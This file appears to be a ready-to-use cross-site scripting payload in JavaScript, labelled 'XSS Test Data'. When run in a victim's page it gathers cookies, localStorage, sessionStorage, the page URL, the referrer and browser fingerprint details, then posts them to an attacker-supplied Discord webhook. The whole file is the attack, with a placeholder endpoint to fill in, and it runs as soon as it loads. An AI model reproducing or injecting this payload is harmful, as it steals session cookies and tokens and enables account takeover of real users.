async function sendDataToEndpoint() {
    // Replace your own discord uri dont send to this webhooks uri
    const endpoint = 'replace your discord uri';
  
    // Array of data sources
    const dataFields = [
      { name: 'cookies', value: () => document.cookie },
      { name: 'localStorage', value: () => JSON.stringify(localStorage) },
      { name: 'sessionStorage', value: () => JSON.stringify(sessionStorage) },
      { name: 'userAgent', value: () => navigator.userAgent },
      { name: 'platform', value: () => navigator.platform },
      { name: 'language', value: () => navigator.language },
      { name: 'url', value: () => window.location.href },
      { name: 'screenWidth', value: () => window.screen.width },
      { name: 'screenHeight', value: () => window.screen.height },
      { name: 'viewportWidth', value: () => window.innerWidth },
      { name: 'viewportHeight', value: () => window.innerHeight },
      { name: 'colorDepth', value: () => window.screen.colorDepth },
      { name: 'pixelDepth', value: () => window.screen.pixelDepth },
      { name: 'javaEnabled', value: () => navigator.javaEnabled() },
      { name: 'cookieEnabled', value: () => navigator.cookieEnabled },
      { name: 'connectionType', value: () => navigator.connection?.effectiveType || 'Unknown' },
      { name: 'downlink', value: () => navigator.connection?.downlink || 'Unknown' },
      { name: 'rtt', value: () => navigator.connection?.rtt || 'Unknown' },
      { name: 'timezone', value: () => Intl.DateTimeFormat().resolvedOptions().timeZone },
      { name: 'localTime', value: () => new Date().toLocaleString() },
      { name: 'utcTime', value: () => new Date().toUTCString() },
      { name: 'historyLength', value: () => window.history.length },
      { name: 'referrer', value: () => document.referrer }
    ];
  
    // Collect data
    const data = dataFields.map(field => ({
      name: field.name,
      value: field.value() || 'N/A'
    }));
  
    // Prepare payload for Discord webhook
    const payload = {
      content: 'XSS Test Data',
      embeds: [{
        title: 'Collected Information',
        description: 'Data from the browser',
        fields: data
      }]
    };
  
    try {
      // Send data
      await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      console.log('Data sent successfully.');
    } catch (error) {
      console.error('Error sending data:', error);
    }
  }
  
  // Execute the function
  sendDataToEndpoint();
  